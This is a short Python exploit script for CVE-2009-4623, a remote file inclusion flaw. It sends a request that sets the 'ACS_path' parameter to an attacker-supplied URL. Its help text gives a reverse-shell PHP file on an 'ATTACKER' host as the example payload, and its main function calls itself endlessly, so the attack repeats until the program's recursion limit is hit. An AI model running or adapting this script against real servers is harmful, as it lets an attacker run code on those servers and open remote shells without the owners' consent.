#!/usr/bin/python3

import requests
import sys
from pyfiglet import Figlet
import argparse
from datetime import datetime

desenho  = Figlet(font='eftiwall')
banner_desenho = desenho.renderText('rtz')
fonte = Figlet(font='digital')
banner_fonte = fonte.renderText('CVE:2009-4623')

print(banner_desenho)
print(banner_fonte)
print('Create By: Carine Constantino\n') 
print('carine.constantino@hotmail.com')
print('----------------------------------------------------')
print('Exploit-DB: https://www.exploit-db.com/exploits/9623')
print('Found by kurdish hackers team')
print('Site: www.kurdteam.org\n')

program_name = argparse.ArgumentParser(description = 'CVE-2009-4623')
url_entrada = program_name.add_argument('--url', action='store', dest='url',
                                   required = True, help = '''Informe uma URL com o comando --url
                                                              Ex.: python3 exploit-cve-2009-4623.py --url https//example.com ''')

payload_rfi_entrada = program_name.add_argument('--payload', action='store', dest='payload',
                                   required = True, help = '''Informe o caminho para o arquivo remoto
                                                              Ex.: python3 exploit-cve-2009-4623.py --url https//example.com --payload http://ATTACKER:9090/reverseshell.php?''')
argumentos_parser = program_name.parse_args()
url = argumentos_parser.url
payload_rfi = argumentos_parser.payload

def attack():

    print("ATTACK...Remote File Inclusion")
    print("TARGET:", url)
    print("PAYLOAD:", payload_rfi)
    data = datetime.now()
    print("Data:", data)

    target = url
    payload = {'ACS_path': payload_rfi}
    req = requests.get(url,params=payload)
    
    

def main():
    attack()
    main()

main()




